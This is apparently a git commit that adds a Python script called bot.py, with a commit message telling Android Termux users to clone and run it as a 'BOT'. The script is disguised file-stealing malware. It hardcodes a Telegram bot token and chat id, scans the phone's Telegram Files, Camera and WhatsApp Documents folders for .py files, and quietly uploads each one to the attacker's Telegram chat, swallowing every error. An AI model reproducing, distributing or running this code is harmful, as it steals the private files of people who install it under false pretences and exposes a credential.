e091bf2722b13397d286ff1c5cd9e80ed3c0a64c
Ahmed <159688807+Tvveero1@users.noreply.github.com>
2024-06-02 08:17:04 +0500

    Add files via upload
    pkg install python
    pkg install git
    git clone https://github.com/tvveero1/BOT
    
    cd BOT
    ls
    python bot.py

---
+++ bot.py
@@ -0,0 +1,58 @@
+import requests,os,sys
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
+#@useridinfobot
+
+def sexy():
+    session=requests.session()
+        
+    bot_token = '7133865411:AAEMp2kca-mtsIMJDqoS09-WxWC4HC66eD8' 
+    chat_id = '6926296391'
+
+#--------( /sdcard/Telegram/Telegram Files
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+   #--------( /sdcard/Telegram/Telegram Files
+    try:
+        sdcard_path = '/sdcard/DCIM/Camera'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass 
+
+#----------( /sdcard/WhatsApp/Media/WhatsApp Documents
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+
+with ThreadPool(max_workers=90) as jjj:
+    jjj.submit(sexy)
+    
+
+
+
